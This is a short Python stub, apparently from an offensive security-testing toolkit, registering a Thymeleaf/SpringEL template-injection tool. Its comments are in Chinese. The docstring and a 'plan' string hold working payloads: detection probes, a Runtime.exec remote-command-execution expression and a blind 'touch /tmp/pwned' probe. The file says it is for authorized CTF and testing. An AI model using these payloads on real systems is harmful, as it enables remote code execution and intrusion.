"""Thymeleaf / SpringEL SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: [[7*7]]→49(Thymeleaf 3 内联)、${7*7}→49(SpEL)。
RCE 预处理表达式: __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(cmd).getInputStream()).next()}__::.x
无回显探测: __${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}__::.x
::.x 是模板片段表达式,让预处理在视图解析流程里触发。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiThymeleafTool(SstiEngineTool):
    name = "ssti_thymeleaf"
    description = "Thymeleaf/SpEL(Java) SSTI:预处理表达式 + T(java.lang.Runtime) RCE(占位符)"
    engine_key = "thymeleaf"
    engine_name = "Thymeleaf / SpringEL"
    default_mode = "exec"
    plan = r"""指纹: [[7*7]]→49(Thymeleaf 3 内联)、${7*7}→49(SpEL)。
RCE 预处理表达式: __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(cmd).getInputStream()).next()}__::.x
无回显探测: __${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}__::.x
::.x 是模板片段表达式,让预处理在视图解析流程里触发。"""
